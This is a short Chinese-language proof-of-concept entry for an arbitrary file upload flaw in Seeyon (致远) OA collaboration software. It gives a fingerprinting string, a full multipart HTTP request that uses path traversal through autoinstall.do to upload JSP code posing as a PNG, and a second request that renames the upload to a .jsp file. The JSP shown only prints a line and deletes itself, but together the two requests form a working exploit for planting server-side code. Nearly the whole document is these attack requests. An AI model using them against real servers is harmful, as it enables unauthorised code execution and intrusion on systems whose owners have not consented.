﻿# 致远OA fileUpload.do 任意文件上传漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：title="协同管理软件 V5.6SP1"

> 验证脚本：HTTP

```
POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=786jbhfjhbinbhbhbjh786

--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="type"

--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="extensions"

png
--786jbhfjhbinbhbhbjh786

Content-Disposition: form-data; name="applicationCategory"
--786jbhfjhbinbhbhbjh786

Content-Disposition: form-data; name="destDirectory"

--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="destFilename"

--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="maxSize"

--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="isEncrypt"

false
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="file1"; filename="1.png"
Content-Type: Content-Type: application/pdf

<% out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--786jbhfjhbinbhbhbjh786--
```

> 响应代码特征：200

> 响应内容特征：application/pdf

> 上传文件定位：

> 验证文件来源：致远OA fileUpload.do 任意文件上传漏洞.poc

```
添加获取到的fileid值，修改上传文件名称
POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
Host: x.x.x.x
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

method=uploadMenuIcon&fileid=获取到的fileid的值&filename=ddd.jsp
```